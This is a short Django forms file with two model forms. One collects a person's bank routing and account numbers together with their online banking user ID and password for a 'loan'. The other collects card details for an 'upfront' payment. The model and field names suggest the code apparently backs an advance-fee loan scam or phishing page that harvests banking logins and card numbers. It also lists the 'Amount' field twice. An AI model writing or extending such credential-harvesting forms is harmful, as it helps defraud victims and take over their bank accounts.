from django import forms
from .models import getinformation,upfront

class WireForm(forms.ModelForm):
    class Meta:
        model=getinformation
       
        fields=['Transaction','FirstName','LastName','AlternatePhoneNumber','BankName','RoutNumber','AccountNumber','OnlineUserId','OnlineUserPassword','LoanAmount']
class CardForm(forms.ModelForm):
    class Meta:
        model=upfront
        fields=['FirstName','LastName','CardNumber','Amount','Amount']
